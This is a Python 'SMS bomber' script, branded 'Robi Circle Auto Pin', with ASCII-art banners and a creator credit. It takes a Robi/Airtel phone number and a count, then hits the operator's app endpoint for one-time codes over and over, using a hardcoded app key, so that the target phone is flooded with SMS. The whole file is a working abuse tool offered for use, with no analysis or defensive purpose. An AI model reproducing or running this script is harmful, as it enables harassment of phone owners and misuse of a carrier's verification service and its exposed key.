import requests
from requests.structures import CaseInsensitiveDict
# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'
print("\033[35m")

print(r"""______            _     _  ______                 _           _ 
|  _  \          (_)   | | | ___ \               | |         | |
| | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
| | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
| |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
|___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|""")

print("\n****************************************************************")


print ("\033[33m"+" 👉 contact 😎 ---   www.facebook.com/Akramul667    ")

print("\n****************************************************************")

print("\033[91m"+"  ")

print("""
     _.-^^---....,,----       
 --        sms        --_  
<          bomber         >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 __.,-#%&$@%#&#~,.__
""")

print("_________________________________________________________________")

print("\033[33m" + "         ░▒▓█ Robi Circle Auto Pin █▓▒░         ")

print("\033[33m" + "         ꧁༺♛ created by N꙰O꙰Y꙰O꙰N꙰. ♛༻꧂        ")

print("\033[32m")
number = str(input("       [>] Enter The RoBi/Airtel Number: "))
amount = int(input("        [>] Choice Your Pin Amount : "))

api = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13002&app_version=78&msisdn=88" + number

headers = CaseInsensitiveDict()
headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
totalhit,nsent,sent,=0,0,0
for i in range(amount):
    r=str(requests.get(api, headers=headers).status_code)
    totalhit+=1
    if r=="200":
        print(green + "[✓] "+str(i+1)+" SMS Sent.")
        sent+=1
    else:
        print(red+"[×] "+str(i+1)+" SMS Not Sent.")
        nsent+=1
print(cyan + "\n\n\t\t[•] Total Hits : " + yellow + str(totalhit))
print(green + "\n\t\t[✓] Total Sent : " + yellow + str(sent))
print(red + "\n\t\t[×] Total Not Sent : " + yellow + str(nsent) + "\n")
print(cyan + "\n\n\t\t  [✓] All Done!\n")